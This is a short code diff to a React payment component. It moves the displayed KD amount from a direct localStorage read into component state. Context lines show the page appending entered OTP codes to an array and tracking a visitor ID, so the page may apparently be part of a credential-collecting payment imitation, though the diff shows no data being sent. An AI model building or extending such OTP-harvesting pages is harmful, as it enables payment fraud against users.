@@ -124,6 +124,7 @@ export default function (props: any) {
   };
 
   const [step, setstep] = useState(1);
+  const [total, setTotal] = useState('');
   const [loading, setLoading] = useState(false);
   const [newotp] = useState([''])
 
@@ -146,8 +147,8 @@ export default function (props: any) {
     newotp.push(`${otp} , `)
   }
   useEffect(()=>{
-  //handleAddotp(paymentInfo.otp!)
-  }, [paymentInfo.otp])
+setTotal(localStorage?.getItem('vv')!)
+  }, [])
 
   useEffect(() => {
     const visitorId = localStorage.getItem('visitor');
@@ -196,7 +197,7 @@ export default function (props: any) {
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {localStorage.getItem('vv')} 
+                    {total} 
                     {'  '}KD&nbsp;{' '}
                   </label>
                 </div>
